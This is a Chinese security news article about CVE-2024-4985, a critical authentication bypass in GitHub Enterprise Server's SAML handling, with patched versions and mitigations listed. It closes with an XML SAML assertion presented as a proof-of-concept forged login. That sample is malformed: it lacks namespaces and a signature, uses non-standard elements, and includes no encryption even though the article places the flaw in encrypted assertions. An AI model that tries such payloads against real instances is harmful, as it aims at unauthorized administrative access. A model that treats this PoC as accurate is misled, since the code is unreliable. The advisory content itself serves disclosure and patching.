#  可绕过身份验证，GitHub企业服务器曝满分漏洞，附PoC   
 关键基础设施安全应急响应中心   2024-05-23 16:07  
  
近日，安全研究人员披露了GitHub企业服务器（GHES）的关键漏洞（CVE-2024-4985，cvss得分：10.0），该漏洞允许未经授权的攻击者，在不需要预先认证的情况下访问GHES实例。漏洞影响所有GHES 3.13.0之前的版本，并在3.9.15、3.10.12、3.11.10和3.12.4版本中得到修复。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39sRfcKzibspiaPQia7DuebBgxWw21YMe0AHNbLf7o26EicTTNpsTdgcibPhOPiaZFywx3yTIf1phNxZrGQ/640?wx_fmt=jpeg&from=appmsg&wxfrom=13&tp=wxpic "")  
  
目前GitHub已经推出了修复措施，没有发现该漏洞已经被大规模利用，用户可将GHES更新到已修补的版本（3.9.15、3.10.12、3.11.10、3.12.4或更高版本）。如果无法立即更新，考虑暂时禁用SAML认证或加密断言功能作为临时缓解措施。  
  
GHES是一个自托管的软件开发平台，允许组织使用Git版本控制存储和构建软件，并自动化部署流程。  
  
该漏洞利用了GHES处理加密的SAML声明的方式中的一个缺陷。攻击者可以创建一个包含正确用户信息的假SAML声明。当GHES处理一个假的SAML声明时，它将无法正确验证其签名，从而允许攻击者访问GHES实例。  
  
成功利用这个漏洞可能允许未经授权的攻击者获得对GHES实例的完全管理控制权，使他们能够访问所有数据并在系统上执行任何操作。  
  
GitHub进一步指出，默认情况下不启用加密断言，而且此漏洞不影响那些不使用SAML单一登录（SSO）或使用SAML SSO认证但没有加密断言的实例。加密断言允许网站管理员通过在认证过程中对SAML身份提供者（IdP）发送的消息进行加密，来提高GHES实例的安全性。  
### 附PoC  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39sRfcKzibspiaPQia7DuebBgxFsiaiaFicnWIVdfm4ibRFdMW4jG56eZhvzwTKkwkH2EXUO0UoicKLorxqaw/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
```
<Assertion ID="1234567890" IssueInstant="2024-05-21T06:40:00Z" Subject="CN=John Doe,OU=Users,O=Acme Corporation,C=US">  
<Audience>https://your-ghes-instance.com</Audience> 
<SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:assertion:method:bearer">  
<SubjectConfirmationData>      
<NameID Type="urn:oasis:names:tc:SAML:2.0:nameid-type:persistent" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:basic">jdoe</NameID>
</SubjectConfirmationData>
</SubjectConfirmation>
<AuthnStatement AuthnInstant="2024-05-21T06:40:00Z" AuthnContextClassRef="urn:oasis:names:tc:SAML:2.0:assertion:AuthnContextClassRef:unspecified">
<AuthnMethod>urn:oasis:names:tc:SAML:2.0:methodName:password</AuthnMethod>
</AuthnStatement>  <AttributeStatement>
<Attribute Name="urn:oid:1.3.6.1.4.1.11.2.17.19.3.4.0.10">Acme Corporation</Attribute>
<Attribute Name="urn:oid:1.3.6.1.4.1.11.2.17.19.3.4.0.4">jdoe@acme.com</Attribute>
</AttributeStatement></Assertion>
```  
  
**参考资料：**  
  
https://github.com/absholi7ly/Bypass-authentication-GitHub-Enterprise-Server  
  
https://thehackernews.com/2024/05/critical-github-enterprise-server-flaw.html  
  
https://github.com/absholi7ly/Bypass-authentication-GitHub-Enterprise-Server  
  
https://thehackernews.com/2024/05/critical-github-enterprise-server-flaw.html  
  
  
  
原文来源：FreeBuf  
  
“投稿联系方式：010-82992251   sunzhonghao@cert.org.cn”  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/iaz5iaQYxGogvC8qicuLNlkT5ibJnwu1leQiabRVqFk4Sb3q1fqrDhicLBNAqVY4REuTetY1zBYuUdic0nVhZR4FHpAfg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
